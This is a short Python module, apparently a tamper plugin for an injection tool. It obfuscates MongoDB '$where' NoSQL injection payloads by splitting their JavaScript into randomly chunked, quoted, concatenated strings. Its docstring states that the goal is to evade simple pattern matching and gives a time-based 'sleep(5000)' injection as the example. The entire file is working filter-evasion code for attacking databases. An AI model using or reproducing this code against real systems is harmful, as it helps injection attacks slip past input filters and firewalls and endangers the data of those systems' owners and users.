import json
import random

def tamper(payload):
    """
    Splits JavaScript strings into concatenated chunks to evade simple pattern matching.
    Example: {"$where": "sleep(5000)"} -> {"$where": "'sl'+'ee'+'p'+'(5'+'00'+'0)'"}
    """
    if not isinstance(payload, dict):
        return payload
    
    def split_string(text):
        if len(text) < 2: return f"'{text}'"
        chunks = []
        i = 0
        while i < len(text):
            chunk_len = random.randint(1, 3)
            chunk = text[i:i+chunk_len]
            chunk = chunk.replace("'", "\\'")
            chunks.append(f"'{chunk}'")
            i += chunk_len
        return "+".join(chunks)

    new_payload = payload.copy()
    
    for key, value in new_payload.items():
        if key == "$where" and isinstance(value, str):
            new_payload[key] = split_string(value)
            
    return json.dumps(new_payload)